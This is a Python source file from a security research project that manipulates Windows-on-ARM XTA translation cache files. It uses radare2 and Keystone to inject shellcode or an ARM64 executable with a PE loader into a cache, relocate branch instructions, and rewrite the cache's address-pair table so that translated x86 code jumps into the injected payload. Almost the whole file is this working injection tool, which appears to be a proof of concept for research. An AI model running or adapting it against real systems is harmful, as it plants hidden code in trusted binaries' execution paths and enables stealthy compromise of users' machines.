# (c) FFRI Security, Inc., 2020 / Koh M. Nakagawa: FFRI Security, Inc.

import sys
from dataclasses import dataclass
from typing import List, Optional, Tuple

import r2pipe
from keystone import KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN, Ks
from r2pyapi import R2Writer

from .utils import hex_as_string, u32_to_u8_array
from .xta_cache import AddressPair, XtaCache


@dataclass
class RelocInfo:
    pos_rva: int
    jmp_addr: int
    insn: str

    def __str__(self) -> str:
        return f"(pos_rva: {hex(self.pos_rva)}, jmp_addr: {hex(self.jmp_addr)}, insn: {self.insn})"

    def __repr__(self) -> str:
        return f"RelocInfo(pos_rva={hex(self.pos_rva)}, jmp_addr={hex(self.jmp_addr)}, insn={self.insn})"


KeyStoneResult = Tuple[List[int], int]


class XtaCacheManipulator:
    def __init__(self) -> None:
        self.ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)

    @staticmethod
    def find_record_offset(
        r2_cache: r2pipe.open_sync.open, record_name: str
    ) -> Optional[int]:
        for entry in r2_cache.cmdj("iHj"):
            if entry["name"] == record_name:
                return entry["vaddr"]
        return None

    @staticmethod
    def fix_xta_cache_header(
        xta_cache: XtaCache, record_name: str, new_value: int
    ) -> None:
        if (
            offset := XtaCacheManipulator.find_record_offset(
                xta_cache.r2_cache, record_name
            )
        ) is None:
            print(f"Unknown record_name {record_name}")
            return None
        xta_cache.r2_cache.cmd(f"s {hex(offset)}")
        xta_cache.r2_cache.cmd(f"wx {hex_as_string(u32_to_u8_array(new_value))}")

    @staticmethod
    def get_relocation_points(
        xta_cache: XtaCache, addr_region: Tuple[int, int]
    ) -> List[RelocInfo]:
        # NOTE: offset value depends on XTACache file's version
        # version: 0x1a
        target_insns = ("bl 0x", "b 0x")
        xta_cache.r2_cache.cmd(f"e search.from = {hex(addr_region[0])}")
        xta_cache.r2_cache.cmd(f"e search.to = {hex(addr_region[1])}")

        stub_code_begin = xta_cache.xta_cache_header.ptr_to_head_blck_stub
        stub_code_end = (
            stub_code_begin + xta_cache.xta_cache_header.size_of_blck_stub_code
        )

        relocs: List[RelocInfo] = list()

        for target_insn in target_insns:
            for result in xta_cache.r2_cache.cmdj(f"/aaj {target_insn}"):
                insn, jmp_addr = result["code"].split(" ")
                jmp_addr = int(jmp_addr, 16)
                if stub_code_begin < jmp_addr < stub_code_end:
                    relocs.append(
                        RelocInfo(
                            pos_rva=result["offset"] - addr_region[0],
                            jmp_addr=jmp_addr,
                            insn=insn,
                        )
                    )

        xta_cache.r2_cache.cmd("e search.from = 0xffffffffffffffff")
        xta_cache.r2_cache.cmd("e search.to = 0xffffffffffffffff")
        return relocs

    @staticmethod
    def insert_address_pair(xta_cache: XtaCache, address_pair: AddressPair) -> None:
        xta_cache.r2_cache.cmd(f"s {hex(xta_cache.xta_cache_header.ptr_to_addr_pairs)}")
        xta_cache.r2_cache.cmd(f"wex {address_pair.as_hex_str()}")

    @staticmethod
    def write_address_pairs(
        xta_cache: XtaCache, address_pairs: List[AddressPair]
    ) -> None:
        new_address_pairs_as_hex_str = "".join(
            pair.as_hex_str() for pair in address_pairs
        )
        xta_cache.r2_cache.cmd(f"s {hex(xta_cache.xta_cache_header.ptr_to_addr_pairs)}")
        xta_cache.r2_cache.cmd(f"wx {new_address_pairs_as_hex_str}")

    @staticmethod
    def overwrite_address_pairs(
        xta_cache: XtaCache,
        address_pairs_injected: List[AddressPair],
        overwritten_point: AddressPair,
    ) -> None:
        if len(xta_cache.address_pairs) < len(address_pairs_injected):
            print(
                "the number of address pairs to be injected is too large",
                file=sys.stderr,
            )
            return

        overwritten_point_index = xta_cache.address_pairs.index(overwritten_point)
        shellcode_entry_index = address_pairs_injected.index(
            AddressPair(rva_arm64=0x0, rva_x86=0x0)
        )

        fixing_point_index_start = overwritten_point_index - shellcode_entry_index

        new_cache_dst_address_pairs = xta_cache.address_pairs.copy()

        for index, shellcode_address_pair in enumerate(address_pairs_injected):
            new_cache_dst_address_pairs[fixing_point_index_start + index] = (
                shellcode_address_pair + overwritten_point
            )

        new_address_pairs = sorted(
            new_cache_dst_address_pairs, key=lambda pair: pair.rva_x86
        )
        XtaCacheManipulator.write_address_pairs(xta_cache, new_address_pairs)

    def get_machine_code(self, asm_str: str) -> KeyStoneResult:
        return self.ks.asm(asm_str)

    def relocates_injected_code(
        self,
        r2_cache: r2pipe.open_sync.open,
        injection_point: int,
        relocs: List[RelocInfo],
    ) -> None:
        """
        performs relocations to the injected code
        """
        print("relocates injected code")
        for reloc in relocs:
            reloc_pos = injection_point + reloc.pos_rva
            insn_code, _ = self.get_machine_code(
                f"{reloc.insn} {reloc.jmp_addr - reloc_pos}"
            )
            r2_cache.cmd(f"s {hex(reloc_pos)}")
            r2_cache.cmd(f"wx {hex_as_string(insn_code)}")

    @staticmethod
    def check_address_pairs_is_not_overwritten(
        xta_cache: XtaCache, injection_point: int, payload_length: int
    ) -> bool:
        return (
            injection_point + payload_length
        ) < xta_cache.xta_cache_header.ptr_to_addr_pairs

    def inject_cache_code(
        self,
        xta_cache: XtaCache,
        payload: List[int],
        injection_point: int,
        relocs: List[RelocInfo],
    ) -> None:
        """
        injects code in XTA cache
        """
        print("injects code into XTA cache")
        if not self.check_address_pairs_is_not_overwritten(
            xta_cache, injection_point, len(payload)
        ):
            print(
                "Cannot write payload because address pairs will be overwritten",
                file=sys.stderr,
            )
            return
        with R2Writer(xta_cache.r2_cache) as writer:
            print(f"injecting into {hex(injection_point)}")
            writer.overwrite_bytes(payload, injection_point)
        self.relocates_injected_code(xta_cache.r2_cache, injection_point, relocs)

    def insert_arm64_exe_or_x86_shellcode(
        self,
        xta_cache: XtaCache,
        loader_payload: List[int],
        loader_entry: int,
        exe_payload: List[int],
        injection_point: int,
    ) -> int:
        """
        inserts PE Loader and executable

        adr x0, addr of exe ------------------------|
        ldr x1, [addr of exe size]                  |
        b loader_entry      ==|                     |
        --- exe size     --   |                     |-- exe_begin_rva
        --- loader       --   |- loader_entry_rva   |
        ===================   |                     |
        --- loader entry -- ==|                     |
        ===================                         |
        ---  ARM64 exe   -- ------------------------|
        ===================
        -------------------
        """
        exe_begin_rva = 4 * 4 + len(loader_payload)
        loader_entry_rva = 4 * 4 + loader_entry

        asm_str = ";".join(
            [
                f"adr x0, {exe_begin_rva}",
                f"ldr x1, 12",
                f"b {loader_entry_rva}",
            ]
        )

        jump_stub, n_insn = self.get_machine_code(asm_str)
        if n_insn != 3:
            print("keystone engine is not properly set", file=sys.stderr)
            return 0

        full_payload = (
            jump_stub + u32_to_u8_array(len(exe_payload)) + loader_payload + exe_payload
        )
        with R2Writer(xta_cache.r2_cache) as writer:
            writer.insert_bytes(full_payload, injection_point)
        return len(full_payload)
